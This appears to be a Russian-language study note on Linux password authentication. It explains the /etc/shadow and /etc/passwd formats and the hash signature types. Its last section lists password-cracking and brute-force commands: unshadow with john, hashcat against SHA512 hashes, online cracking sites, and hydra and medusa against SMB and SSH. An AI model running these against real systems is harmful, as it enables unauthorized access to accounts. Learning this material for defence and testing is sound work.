#### Принцип работы:
---
1. Пользователь **вводит пароль**.
2. **Пароль хэшируется (или шифруется)** по специальному алгоритму (вероятно, *Yescrypt*, информация о дефолтном типе хэширования при создании пользователя – в файле `/etc/logins.defs`).
3. Полученный хэш сравнивается (сохраняется) с хэшем пользователя в файле `/etc/shadow` строкой вида:

```bash title:"Пароль в /etc/shadow"
$<signature>$<parameter>$<salt>$<encrypted>
```

#### Файлы, связанные с парольной аутентификацией
---
1. `/etc/passwd` - хранит информацию о пользователях системы, включая их имена, UID, GID и домашние каталоги.
2. `/etc/shadow` - содержит зашифрованные пароли пользователей и другую информацию, такую как срок действия пароля и время последнего изменения.
3. `/etc/group` - содержит информацию о группах пользователей.
4. `/etc/login.defs` - задаёт параметры по умолчанию для новых учётных записей пользователей, такие как минимальная длина пароля и срок его действия.
5. `/var/log/auth.log` или `/var/log/secure` - логи аутентификации, где записываются события, связанные с процессом входа в систему и другими действиями, требующими аутентификации.
#### Сигнатуры хэшей в файле `/etc/shadow`
---

| **Сигнатура**            | **Тип шэша** |
| ------------------------ | ------------ |
| \$1\$                    | MD5          |
| \$2a\$                   | BlowFish     |
| \$2a\$ / \$2b\$ / \$2y\$ | Bcrypt       |
| \$2y\$                   | EksBlowFish  |
| \$5\$                    | SHA256       |
| \$6\$                    | SHA512       |
| \$y\$ / \$7\$            | YesCrypt     |

> [!NOTE] Общая структура строки в `/etc/shadow`
> `username:password:last_change:min:max:warn:inactive:expire:`

| **Поле**    | **Значение**                                                                                                                                  |
| ----------- | --------------------------------------------------------------------------------------------------------------------------------------------- |
| username    | Имя пользователя                                                                                                                              |
| password    | Хэш пароля или символ, указывающий на статус (например, ! для заблокированных аккаунтов)                                                      |
| last_change | Дата последнего изменения пароля, выраженная в днях с 1 января 1970 года (Unix epoch)                                                         |
| min         | Минимальное количество дней между изменениями пароля. Если значение равно 0, это означает, что пользователь может менять пароль в любое время |
| max         | Максимальное количество дней, в течение которых пароль остаётся действительным. После этого срока пользователь должен изменить пароль         |
| warn        | Количество дней до истечения срока действия пароля, когда пользователь получит предупреждение о необходимости смены пароля                    |
| inactive    | Количество дней после истечения срока действия пароля, по истечении которого учётная запись будет отключена                                   |
| expire      | Дата, после которой учётная запись становится недействительной, выраженная в днях с 1 января 1970 года                                        |

> [!NOTE] Общая структура строки в `/etc/passwd`
> `username:password:UID:GID:GECOS:home_directory:shell`

| **Поле**       | **Значение**                                                                                                                                   |
| -------------- | ---------------------------------------------------------------------------------------------------------------------------------------------- |
| username       | Имя пользователя                                                                                                                               |
| password       | Зашифрованный пароль. В современных системах обычно содержится x, что указывает на то, что зашифрованные пароли хранятся в файле /etc/shadow   |
| UID (User ID)  | Уникальный идентификатор пользователя                                                                                                          |
| GID (Group ID) | Идентификатор основной группы пользователя                                                                                                     |
| GECOS          | Дополнительная информация о пользователе. Обычно содержит полное имя и другие данные, такие как номер телефона или адрес, но может быть пустым |
| home_directory | Путь к домашнему каталогу пользователя                                                                                                         |
| shell          | Оболочка (shell), используемая пользователем при входе в систему. Например, это может быть /bin/bash, /bin/sh, /usr/bin/zsh                    |
#### Обход парольной защиты
1. J2R
```bash title:j2r
unshadow /etc/passwd /etc/shadow > unshadowed.txt
john --wordlist=crack.txt unshadow.txt
```

2. Hashcat
```bash title:hashcat
hashcat -m 1800 -a 0 hashes.txt passwords.txt
```

3. Онлайн-сервисы
	- [Free Password Hash Cracker](https://crackstation.net/?utm_source=Securitylabru)
	- [Online hash crack](https://www.onlinehashcrack.com/?utm_source=Securitylabru)
	- [cmd5](https://cmd5.org/)
4. Удаленно:
```bash
hydra -L users.txt -P passwords.txt 192.168.1.10 smb
medusa -U users.txt -P passwords.txt -h 192.168.1.10 -M ssh
```
5. LiveUSB